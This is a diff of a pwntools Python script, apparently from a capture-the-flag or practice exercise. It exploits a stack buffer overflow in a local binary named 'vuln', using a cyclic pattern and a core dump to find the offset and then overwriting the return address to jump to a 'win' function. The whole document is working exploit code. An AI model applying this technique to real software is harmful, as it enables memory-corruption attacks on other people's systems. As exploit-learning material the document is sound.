@@ -1,31 +1,25 @@
 from pwn import *
 
-elf = context.binary = ELF("./vuln", checksec=False)
+elf=context.binary =ELF("./vuln")
+p=process(elf.path)
 
-p = process(elf.path)
-
-win = elf.sym["win"]
-
-log.info(f"win() = {hex(win)}")
-
-# Find this experimentally with a cyclic crash
-payload = cyclic(200)
-
-p.sendline(payload)
+payload=cyclic(200)
+p.sendlineafter(b"Input:",payload)
 p.wait()
 
-core = p.corefile
+core=p.corefile
+log.info(f"RSP_addr crased: {core.rsp}")
 
-offset = cyclic_find(core.read(core.rsp, 8))
+data_crash=core.read(core.rsp,8) # i wanna read 8-bytes
+log.info(f"data that cause crash at rsp: {data_crash}")
+offset=cyclic_find(data_crash[:4])      #cyclic_find loves work with 4-bytes to find the offset
+log.info(f"Offset crashed at: {offset}")
 
-log.info(f"offset = {offset}")
+win_addr=elf.sym["win"]
+log.info(f"win_addr at: {win_addr}")
+f_payload=flat(b"A"*offset,win_addr)
+log.info(f"the payload: {f_payload}")
 
-payload = flat(
-    b"A" * offset,
-    win
-)
-
-p = process(elf.path)
-p.sendline(payload)
-
-p.interactive()
+p=process(elf.path)
+p.sendlineafter(b"Input:",f_payload)
+print(p.recvall().decode())
